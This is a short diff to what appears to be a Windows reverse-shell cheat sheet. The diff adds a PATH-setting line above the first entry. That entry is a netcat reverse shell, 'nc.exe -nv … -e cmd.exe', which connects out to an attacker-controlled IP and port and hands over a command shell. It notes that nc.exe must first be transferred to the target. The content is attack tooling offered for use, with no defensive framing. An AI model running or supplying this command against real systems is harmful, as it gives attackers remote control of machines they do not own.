@@ -1,3 +1,6 @@
+##Set Path if commands not working
+set PATH=%PATH%;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0
+
 1. **Netcat reverse shell with verbose output.** Requires nc.exe transferred to target.  
 nc.exe -nv 192.168.0.0 8888 -e cmd.exe
 
